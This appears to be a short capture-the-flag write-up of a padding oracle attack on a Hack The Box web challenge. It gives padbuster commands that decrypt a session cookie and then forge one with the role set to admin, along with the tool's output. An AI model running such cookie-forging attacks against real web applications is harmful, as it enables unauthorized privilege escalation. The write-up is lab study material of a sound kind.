---
title:  "Oracle Padding"
date:   2021-08-05 21:15:00 +0000
categories: [techniques]
tags: [burp, web exploitation]
---


STEP 1
======
```
padbuster http://docker.hackthebox.eu:37742 zjtTgJyHOn9YxWLIJu%2BnoDGlL9vvl4RGVm44osvhYXxAkHGGKroFCA%3D%3D --cookies "PHPSESSID=7d5guetet0tj3o1kn8lrd77da0;iknowmag1k=zjtTgJyHOn9YxWLIJu%2BnoDGlL9vvl4RGVm44osvhYXxAkHGGKroFCA%3D%3D" 8 --encoding=0
```

*** Response Analysis Complete ***

The following response signatures were returned:


ID# Freq Status Length Location
    
1 256 302 0 profile.php


STEP 2
======
```
padbuster http://docker.hackthebox.eu:37742/profile.php zjtTgJyHOn9YxWLIJu%2BnoDGlL9vvl4RGVm44osvhYXxAkHGGKroFCA%3D%3D --cookies "PHPSESSID=7d5guetet0tj3o1kn8lrd77da0;iknowmag1k=zjtTgJyHOn9YxWLIJu%2BnoDGlL9vvl4RGVm44osvhYXxAkHGGKroFCA%3D%3D" 8 --encoding=0
```

*** Finished ***

[+] Decrypted value (ASCII): {"user":"bdmin","role":"user"}

[+] Decrypted value (HEX): 7B2275736572223A2262646D696E222C22726F6C65223A2275736572227D0202

[+] Decrypted value (Base64): eyJ1c2VyIjoiYmRtaW4iLCJyb2xlIjoidXNlciJ9AgI=


STEP 3
======
```
padbuster http://docker.hackthebox.eu:37742/profile.php zjtTgJyHOn9YxWLIJu%2BnoDGlL9vvl4RGVm44osvhYXxAkHGGKroFCA%3D%3D --cookies "PHPSESSID=7d5guetet0tj3o1kn8lrd77da0;iknowmag1k=zjtTgJyHOn9YxWLIJu%2BnoDGlL9vvl4RGVm44osvhYXxAkHGGKroFCA%3D%3D" 8 --encoding=0 --plaintext "{\"user\":\"admin\",\"role\":\"admin\"}"
```

*** Finished ***

[+] Encrypted value is: LDRCU61StZbYrdIXPROTGIprI45i7IsYMAovrw2IGp8AAAAAAAAAAA%3D%3D


STEP 4
======
We add the newly made encrypted value of "role=admin" to the cookies and we find the flag.


Before
------
![img-description](/images/Oracle-Padding-1.png)
_BEFORE - encrypted value of "role=admin" to the cookies_


After
-----
![img-description](/images/Oracle-Padding-2.png)
_AFTER - encrypted value of "role=admin" to the cookies_



